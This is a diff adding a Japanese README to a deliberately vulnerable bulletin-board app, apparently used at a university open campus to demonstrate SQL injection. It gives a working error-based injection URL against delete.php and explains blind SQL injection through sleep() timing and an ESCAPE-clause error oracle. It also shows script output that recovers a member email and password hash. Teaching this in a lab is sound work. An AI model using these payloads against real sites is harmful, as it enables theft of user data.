@@ -1,2 +1,67 @@
 オープンキャンパス用mini_bbs
 SQLI等の脆弱性体験に使用
+
+delete.phpに脆弱性あり
+*参考 http://blog.tokumaru.org/2012/12/blind-sql-injection-php-exploit.html
+
+クローン(出来るか分からないが)して、MYSQLにmini_bbsDB作って.sql(DBは入力済みであり、はtokumaru→kishibeにして、その他もいろいろテストしてある)をmysqlに読み込ませて、参考urlの通りやると実験できるはず
+
+extractvalue(xmlを解析、処理する関数)でsqlインジェクション攻撃---XMLではないのでエラーとして表示される
+<----------------------------------------------------------------------------------------------------------------------------------------->
+http://example.jp/minibbs/delete.php?id=35-(select+extractvalue(char(60),concat(char(47,36),(select+email+from+members+limit+1+offset+0))))
+
+char(60)='<' char(47,36)='/$'
+id=35のところはログインユーザーの書き込みidなので、それに合わせて変更。わからない場合はphpmyadminか何かで見たら早い
+<----------------------------------------------------------------------------------------------------------------------------------------->
+
+ブラインドsqlインジェクション攻撃---クエリの結果が表示されない前提で、SQLインジェクションによりデータを盗みだす手法
+・問い合わせ結果をファイルに書き出すSQL文等を使う
+・SQL文の実行結果から1ビットの情報を得て、それを繰り返す
+つまり賢い脳筋
+
+SQL文の問い合わせから1ビットの情報を取り出す手段
+・実行の時間差を使う---sleep関数
+・データの更新・削除の成功・失敗を使う
+・レスポンスのステータスの違い(200と500等)を使う
+・SQL文からping等通信手段を呼び出す
+・SQL文の実行エラーを使う（厳密なブラインドではない）
+<----------------------------------------------------------------------------------------------------------------------------------------->
+実行時間例: members表の1行目、email列の1文字目が'a'であれば3秒待つ問い合わせ。実際には't'なので、直ちにnullが返ります。
+
+mysql> SELECT if(substr((SELECT email FROM members LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);
+
+substr…文字列の一部分を返す--今回の場合limit1,offset0で1行目、substr(,1,1)なので1文字
+substr ( string $string , int $start [, int $length ] ) $start…開始位置(0,1,2) $length…lengthバイト
+limit…取得する行数　offset…開始位置
+
+<------------------------------------------------------------------------------------------------------------------------------------------>
+ESCAPE句を使用する手段
+mysql> SELECT * FROM members WHERE email LIKE '%#%%' ESCAPE '#';
+Empty set (0.00 sec)
+
+ESCAPE句に指定する文字は1文字でなければならず、それ以外はエラーになります。
+mysql> SELECT * FROM members WHERE email LIKE '#%' ESCAPE '##';
+ERROR 1210 (HY000): Incorrect arguments to ESCAPE
+
+
+一文字目が 'a' かどうかを問い合わせて、'a'ではないので、ESCAPE句が 'AB' (2文字)となり、エラーとなる例。
+mysql> SELECT id FROM members WHERE id LIKE 'X' ESCAPE if(substr((SELECT email FROM members LIMIT 1 OFFSET 0),1,1) = 'a', 'A','AB');
+ERROR 1210 (HY000): Incorrect arguments to ESCAPE
+
+一文字目が 't' かどうかを問い合わせて、真なので、ESCAPE句が 'A' (1文字)となり、エラーにはならない例。
+mysql> SELECT id FROM members WHERE id LIKE 'X' ESCAPE if(substr((SELECT email FROM members LIMIT 1 OFFSET 0),1,1) = 't', 'A','AB');
+Empty set (0.00 sec)
+
+これを何回も繰り返すことで、テーブルの内容を取得できるが、人力だと死ぬのでスクリプトを動かします。
+->BSQLI.php
+
+$ time php BSQLI.php
+match : TOKUMARU@EXAMPLE.JP
+match : 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8
+
+real    0m2.977s
+user    0m0.004s
+sys     0m0.508s
+
+取得できる
+<------------------------------------------------------------------------------------------------------------------------------------------>
